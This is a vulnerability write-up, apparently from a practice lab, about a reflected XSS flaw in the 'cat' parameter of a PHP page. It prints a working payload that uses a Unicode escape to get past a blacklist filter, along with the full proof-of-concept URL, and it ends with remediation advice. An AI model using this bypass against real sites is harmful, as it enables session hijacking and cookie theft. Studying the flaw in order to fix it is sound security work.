# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or contextual output encoding, allowing arbitrary JavaScript execution in a victim’s browser.

The application attempts blacklist-based filtering, which can be bypassed using Unicode escape sequences.

---

## Vulnerable Endpoint

```text id="poc34"
http://kzlabs.com/punishment/34.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="param34"
cat
```

---

## Payload Used

```html id="payload34"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/punishment/34.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
   ```

2. Observe that the supplied payload is reflected into the response.

3. The payload bypasses the application’s blacklist filter using Unicode encoding.

4. JavaScript executes automatically and triggers a popup dialog.

---

## Proof of Concept

```text id="poc34final"
http://kzlabs.com/punishment/34.php?cat=%3CiMg%20src=x%20onerror=%5Cu0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/9695a889-5a50-42d2-9c7c-134f76926388" />


---

## Impact

* Arbitrary JavaScript execution
* Session hijacking
* Cookie theft
* Phishing attacks
* Client-side defacement

---

## Root Cause

The application reflects user-controlled input directly into the response without proper output encoding and relies on insecure blacklist-based filtering.

---

## Recommendations

* Implement contextual output encoding
* Use allowlist-based validation
* Avoid blacklist filtering
* Sanitize user-controlled input before rendering
* Deploy a strict Content Security Policy (CSP)
